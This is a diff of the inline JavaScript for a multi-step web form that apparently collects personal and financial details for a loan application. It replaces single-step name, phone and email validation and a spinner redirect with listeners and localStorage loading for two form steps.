-                errorMsg = 'Last name must be at least 2 characters.';
-            }
-
-            // Phone number validation (lenient: 9 to 11 digits)
-            if (!phoneRaw) {
-                phoneGroup.classList.add('invalid');
-                isValid = false;
-                errorMsg = 'Phone number is required.';
-            } else if (!/^\d{9,11}$/.test(phoneRaw)) {
-                phoneGroup.classList.add('invalid');
-                isValid = false;
-                errorMsg = 'Phone number must be 9, 10, or 11 digits (only numbers).';
-            } else if (!isValidPhoneNumber(phoneRaw)) {
-                phoneGroup.classList.add('invalid');
-                isValid = false;
-                errorMsg = 'Please enter a valid phone number (9-11 digits).';
-            }
-
-            // Email is optional but if provided must be valid
-            const email = emailInput.value.trim();
-            if (email && (!email.includes('@') || !email.includes('.') || email.length < 5)) {
-                emailInput.classList.add('invalid');
-                isValid = false;
-                errorMsg = 'Please enter a valid email address (e.g., name@domain.com).';
-            }
-
-            if (!isValid) {
-                showError(errorMsg || 'Please correct the highlighted fields.');
-                const firstInvalid = document.querySelector('.invalid');
-                if (firstInvalid) firstInvalid.scrollIntoView({ behavior: 'smooth', block: 'center' });
-                return false;
-            }
-            return true;
-        }
-
-        // ========== Save data, show spinner, wait 3 seconds, then redirect ==========
-        let isProcessing = false;
-
-        function proceedToSummary() {
-            if (isProcessing) return;
-            if (!validateForm()) return;
-
-            // Save data to localStorage
-            localStorage.setItem('firstName', firstNameInput.value.trim());
-            localStorage.setItem('lastName', lastNameInput.value.trim());
-            localStorage.setItem('email', emailInput.value.trim());
-            localStorage.setItem('phone', phoneInput.value.trim());
-
-            // Disable button and show spinner (exactly like cheat sheet)
-            nextBtn.disabled = true;
-            nextBtn.classList.add('disabled-btn');
-            isProcessing = true;
-            spinner.style.display = 'flex';
-
-            // 3-second loading simulation before redirect
-            setTimeout(() => {
-                window.location.href = 'summary.html';
-            }, 3000);
-        }
-
-        // ========== Event listeners ==========
-        nextBtn.addEventListener('click', proceedToSummary);
-
-        // Clear error & highlights when user starts typing again
-        const clearErrorOnInput = (el) => {
-            el.addEventListener('input', () => {
+    const allStep1Fields = [firstName, lastName, email, phoneInput, ageGroup, gender];
+    allStep1Fields.forEach(field => {
+        if (field) {
+            const eventType = field.tagName === 'SELECT' ? 'change' : 'input';
+            field.addEventListener(eventType, () => {
+                field.classList.remove('invalid');
+                if (field.id === 'phone') phoneWrapper.classList.remove('invalid');
                 hideError();
-                el.classList.remove('invalid');
-                if (el.id === 'phone') phoneGroup.classList.remove('invalid');
             });
-        };
-        clearErrorOnInput(firstNameInput);
-        clearErrorOnInput(lastNameInput);
-        clearErrorOnInput(emailInput);
-        clearErrorOnInput(phoneInput);
+        }
+    });
+    phoneInput.addEventListener('input', () => { phoneWrapper.classList.remove('invalid'); hideError(); });
+    const step2FieldList = [employmentStatus, monthlyIncome, monthlyNeeds, dependants, loanPurpose, telecelTenure, usageFrequency, weeklySpend, avgTransaction, currentBalance, everDefaulted, outstandingLoans];
+    step2FieldList.forEach(f => {
+        if (f) f.addEventListener('change', () => { f.classList.remove('invalid'); hideError(); });
+    });
+    usageFrequency.addEventListener('change', () => { updateSpendLabel(); usageFrequency.classList.remove('invalid'); hideError(); });
 
-        // Phone specific: remove invalid from group on input
-        phoneInput.addEventListener('input', () => {
-            phoneGroup.classList.remove('invalid');
-            hideError();
-        });
-
-        // Expose hideError globally for close button
-        window.hideError = hideError;
-    </script>
+    loadStep1FromStorage();
+    loadStep2FromStorage();
+    step1.classList.remove('hidden-step');
+    step2.classList.add('hidden-step');
+    if (!localStorage.getItem('everDefaulted')) everDefaulted.value = 'No';
+    if (!localStorage.getItem('outstandingLoans')) outstandingLoans.value = 'No';
+    if (!usageFrequency.value) usageFrequency.value = 'Daily';
+    updateSpendLabel();
+</script>
 </body>
-
 </html>
